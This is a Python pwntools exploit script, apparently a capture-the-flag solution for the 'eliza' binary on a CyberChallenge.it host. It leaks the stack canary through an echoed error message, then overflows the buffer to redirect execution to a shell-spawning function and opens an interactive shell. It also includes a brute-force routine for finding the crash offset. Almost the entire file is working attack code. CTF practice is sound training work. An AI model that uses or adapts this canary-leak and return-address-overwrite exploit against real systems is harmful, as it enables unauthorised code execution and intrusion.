#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host eliza.challs.cyberchallenge.it --port 9131 eliza
from pwn import *
from typing import Any

# Set up pwntools for the correct architecture
exe = context.binary = ELF("eliza")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "eliza.challs.cyberchallenge.it"
port = int(args.PORT or 9131)


def start_local(argv: list[str] = [], *a: Any, **kw: Any):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv: list[str] = [], *a: Any, **kw: Any):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv: list[str] = [], *a: Any, **kw: Any):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak eliza
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)


def brute_force():
    for i in range(69, 128):
        from subprocess import run, PIPE

        process = run(["./eliza"], input=b"a" * i, stdout=PIPE)
        line = process.stdout
        print(line)
        if process.returncode != 0:
            print(i)
            exit()
    exit(1)


# brute_force()

io = start()

OFFSET = 72
SHELL = exe.symbols["sp4wn_4_sh311"]

io.send(b"a" * (OFFSET + 1))
io.recvuntil(b'Sorry, "')
line = io.recvuntil(b'"', drop=True)
print(line)
index = line.rfind(b"a") + 1
canary = b"\x00" + line[index : index + 7]
print(canary)
assert len(canary) == 8, len(canary)
io.send(b"a" * OFFSET + canary + b"a" * 8 + p64(SHELL))
io.recvuntil(b'Sorry, "')
io.sendline(b"")

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
